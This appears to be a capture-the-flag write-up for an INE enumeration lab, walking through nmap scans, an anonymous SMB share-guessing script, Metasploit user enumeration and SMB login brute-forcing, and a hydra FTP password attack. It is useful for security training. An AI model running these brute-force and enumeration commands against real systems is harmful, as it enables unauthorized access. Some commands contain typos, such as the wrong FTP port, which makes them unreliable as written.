#INE Assessment Methodologies: Enumeration CTF1
>Authorized training lab
**Target:** ‘target.ine.local
**TOOLS:** ‘nmap’,  ‘smbclient’, Metaploit(‘smb_enumusers’, ‘smb_login’), ‘hydra’, ‘FTP’, ‘SSH’
---
##Step 0: Scan the target
‘’’
nmap -sC -sV -O <target-ip> -oX <filename>
‘’’
<img width="940" height="552" alt="image" src="https://github.com/user-attachments/assets/ac7dba19-f97e-4534-999d-3904e91fecb1" />

Samba matches the lab’s own hint abou the anonymous share, so that’s where I started.
---
---
##Flag1: Anonymous Samba share
##Listing shares
```
Smbclient -L //<target-ip>
```
<img width="940" height="400" alt="image" src="https://github.com/user-attachments/assets/eb5b0166-a2fa-4ba7-b792-f67ccda2e584" />

**Why:** ‘-L’ asks the server to list every share it offers, without connecting  to  any of them.
**Result:** only ‘print$’ and ‘IPC$’ showed up – the default administrative share, nohing that looks like the “anonymous share” from the hint. A share can exist on the server without tbeing advertised in this listing, so I couldn’t rule
##Brute-forcing share names
Since the obvious listing came up empty, I went  online and found a small script to try a wordlist of common share names directly, instead of relying on the server to tell me what exists.
```
Nano share.sh
```
<img width="940" height="514" alt="image" src="https://github.com/user-attachments/assets/8113d91d-7398-4b75-b504-3070054bbbdf" />

```
#!/bin/bash

# Path to your wordlist
wordlist="/root/Desktop/wordlists/shares.txt"
target="target.ine.local"

# Loop through each share in the wordlist
while read -r share; do
  echo "Attempting anonymous login to share: $share"

  # Try to connect anonymously
  smbclient "\\\\$target\\$share" -U ""%"" -N

  if [ $? -eq 0 ]; then
    echo "[+] Anonymous access successful for share: $share"
  else
    echo "[-] Failed to access share: $share"
  fi
done < "$wordlist" 
‘’’
**How It works:**
-	‘-U “%” ‘ passes an empty uername and password to ‘smbclient’, which is how you request an anonymous connection.
-	‘-N’ supresses the password prompt so the loop doesn’t stop and wait  for input on every attempt 
-	‘$?’ is the exit status of the last command; ‘smbclient’  returns ‘0’ on a successful connection and non-zero on failure, so checking it tells the script whether that share name was valid.
‘’’
Chmod +x <script>
./<script>
```
  <img width="816" height="727" alt="image" src="https://github.com/user-attachments/assets/560f4c82-b306-4330-b893-9e1300e3ddf6" />

**Result: ** most names failed with ‘NT_STATUS_BAD_NETWORK_NAME’ (the share does’nt exit), but pubfiles succeeded.
##Reading the share
```
smbclient //<target-ip>/pubfiles
```
```
smb: \> ls
smb: \> more flag1.txt
```
 <img width="940" height="305" alt="image" src="https://github.com/user-attachments/assets/d76bb1be-f607-40d3-b47c-287e1ed375df" />

---
---
##Flag 2: A samba user with weak password
The hint points at a private share named after a username, which means I first need valid usernames, then valid passwords.
##Enumerating valid usernames 
```
search smb_enumusers
setg rhosts <target-ip>
run
```
<img width="940" height="432" alt="image" src="https://github.com/user-attachments/assets/47d681ac-b1ba-4ddd-b2ff-bed4c319dbae" />

**Why:**  ‘smb_enumusers’ queries the SMB service for local account names using the SAM Security Account Manger) protocol, without needing valid credentials first. This turns “ I don’t know any usernames” into a concrete list.
**Resuts:** three usernames : ‘josh’, ‘nancy’, ‘bob’ I save these into ‘ users.txt’ for the next step.
##Brute-forcing passwords for those usernames
```
Set user_file users.txt
set  pass_file <suggested wordlist>
set verbose false
run
```
<img width="940" height="253" alt="image" src="https://github.com/user-attachments/assets/2a6571ed-79b5-400d-9a47-902cd2d8dc1b" />

**How it works:** ‘smb_login’ takes every combination of the usernames and passwords in the files and attempts an SMB authentication with each pair, reporting the successful ones
**Result: ** 5 valid credentials pairs came back, including  ‘josh:purple’ and ‘administrator:admin’, ‘josh’ is the one that matches the hint, since the private share for a “ bad password” user would be named after that user.
```
smbclient \\\\<target-ip>\\josh -U josh
```
```
smb: \> ls
smb: \> more flag2.txt
```
<img width="940" height="614" alt="image" src="https://github.com/user-attachments/assets/a767833d-0108-4948-a4a7-27063db46718" />

**Result:** the file contained the flag and a note
<img width="940" height="524" alt="image" src="https://github.com/user-attachments/assets/8ee10ba6-9467-4388-b09a-d6f673f79c46" />


---
---
Flag 2's note said to find an FTP service and check its banner. The original scan only checked the 1000 most common ports and didn't show one, so I scanned every port this time.
```
nmap  -p- <target-ip> -sV
```
<img width="940" height="574" alt="image" src="https://github.com/user-attachments/assets/d55618b0-29b6-45bf-9705-a138b3f6a7e5" />

**Why ‘-p’:* this scans all the 65535 TCP ports instead of default top 1000, A service hiding on an unusual port, like FTP here, is invisible to a default scan.
**Results:** ‘vsftp 2.0.8 or later’ running on port **5554**, not the standard port 21.
##Brute-forcing FTP credentials
```
hydra -L users.txt -P /root/Desktop/wordlists/unix_passwords.txt  ftp://<target-ip>:5554
```
**Result:** `alice:pretty` worked. Notice `alice` is a username that hadn't come up in the SMB enumeration, found only because the hint pointed me toward FTP specifically.
<img width="940" height="391" alt="image" src="https://github.com/user-attachments/assets/e40290f3-41ba-4697-b4ea-89ef4c6498d2" />

```
ftp <target-ip> 554
```
<img width="940" height="516" alt="image" src="https://github.com/user-attachments/assets/02c8b9ab-5e1f-48d1-acce-bedba1658219" />

**Result:** the FTP banner itself read:
```
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
```

That banner names three more users (`ashley`, `alice`, `amanda`) with weak passwords, which is exactly the kind of leak the hint told me to look for. Directory listing then showed `flag3.txt`.
---
---
##Flag 4: The SSH login waring banner
>  hint: this is a warning meant to deter unauthorized users from logging in
##What I did
```
ssh <target-ip>
```
<img width="940" height="617" alt="image" src="https://github.com/user-attachments/assets/c75b6b5a-2cf6-470a-8cf4-411c71fefa19" />

**Why:** "a warning meant to deter unauthorized users" is a very literal description of an SSH **pre-login banner** — the block of text a server can be configured to show before a user even enters credentials, usually for legal or policy reasons ("unauthorized access is prohibited", and so on).
**Result:** the banner displayed the standard warning text, and the flag was embedded directly inside
<img width="940" height="617" alt="image" src="https://github.com/user-attachments/assets/8388ae48-70e5-4554-99d7-1165c27f8fe1" />
---
